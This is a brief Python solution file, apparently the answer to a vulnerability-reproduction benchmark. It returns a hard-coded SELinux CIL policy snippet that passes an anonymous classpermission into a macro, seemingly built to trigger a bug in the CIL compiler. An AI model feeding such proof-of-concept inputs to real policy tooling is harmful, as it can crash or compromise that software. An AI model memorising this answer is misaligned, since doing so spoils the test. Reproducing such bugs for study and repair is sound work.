class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """(class file (read))
(permission read)
(macro foo ((c classpermission))
  (classpermissionset bar c)
)
(foo (classpermission (file read)))"""
        return poc.encode('utf-8')
